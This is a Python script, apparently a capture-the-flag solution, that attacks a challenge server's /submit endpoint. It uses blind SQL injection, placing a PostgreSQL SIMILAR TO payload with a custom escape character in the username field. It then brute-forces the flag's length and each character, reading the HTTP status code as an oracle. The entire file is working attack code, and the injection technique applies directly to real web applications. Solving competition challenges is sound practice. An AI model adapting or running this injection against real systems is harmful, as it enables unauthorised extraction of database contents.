from pwn import *
import requests

context.log_level = logging.INFO


# Refer https://www.postgresql.org/docs/current/functions-matching.html#FUNCTIONS-SIMILARTO-REGEXP
# we hope flag doesn't contain Z and use it as escape character for regex

burp0_url = "https://penguin.chall.lac.tf:443/submit"
flag_charset = list(string.ascii_letters[:-1] + string.digits) + ['Z_']

payload = "' or name SIMILAR TO 'lactfZ{{{}Z}}' ESCAPE 'Z"

flag_len = 0
progress = log.progress('FLAG LEN: ', status=flag_len, level=logging.INFO)
for flag_len in range(1, 50):
    progress.status(flag_len)
    burp0_data = {"username": payload.format(f'_{{{flag_len}}}')}
    res = None
    while res is None:
        try:
            res = requests.post(burp0_url, data=burp0_data)
        except:
            pass
    if res.status_code == 200:
        break

progress.success(flag_len)

flag = ['_'] * flag_len
progress = log.progress('FLAG: ', status=''.join(flag), level=logging.INFO)
for i in range(flag_len):
    found = False
    for c in flag_charset:
        flag[i] = c
        progress.status(''.join(flag))
        burp0_data = {"username": payload.format(''.join(flag))}
        res = None
        while res is None:
            try:
                res = requests.post(burp0_url, data=burp0_data)
            except:
                pass
        if res.status_code == 200:
            found = True
            break
    
    if not found:
        log.error("Character not found!")
        break

progress.success(''.join(flag))

flag = ''.join(flag)
print(f"lactf{{{flag.replace('Z', '_')}}}")